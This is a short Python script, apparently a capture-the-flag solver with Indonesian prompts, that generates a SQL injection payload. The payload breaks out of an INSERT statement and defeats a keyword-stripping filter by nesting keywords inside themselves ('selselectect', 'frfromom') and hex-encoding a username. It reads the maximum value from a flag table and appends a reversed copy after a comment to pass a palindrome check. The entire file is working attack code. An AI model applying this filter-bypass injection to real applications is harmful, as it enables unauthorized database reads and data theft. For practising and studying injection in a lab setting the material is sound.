import binascii
import random
import string


def random_id(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_payload():
    print("="*50)
    print("   solver")
    print("="*50)
   
    target_user = input("[?] Log in dengan username yang sudah dibuat: ").strip()
    if not target_user: return
    user_hex = "0x" + binascii.hexlify(target_user.encode()).decode()
   
    fake_id = random_id()
    print(f"[*] Random ID: {fake_id}")
   
    bypass_where = "wherwheree"


    user_query = f"(selselectect(id)frfromom(ususerers){bypass_where}(ususerername={user_hex}))"


    flag_query = "(selselectect(max(flflagag))frfromom(flflagag))"


    injection = f"1'),('{fake_id}',{user_query},{flag_query})"


    filters = ["select", "from", "union", "flag", "user", "where", "/*"]
    sanitized_view = injection
    for f in filters:
        sanitized_view = sanitized_view.replace(f, "")
       
    balancer = sanitized_view[::-1]
    final_payload = f"{injection}#{balancer}"


    print("\n[+] Payloadnya masukkin ke palindrome:")
    print("-" * 20)
    print(final_payload)
    print("-" * 20)


if __name__ == "__main__":
    generate_payload()
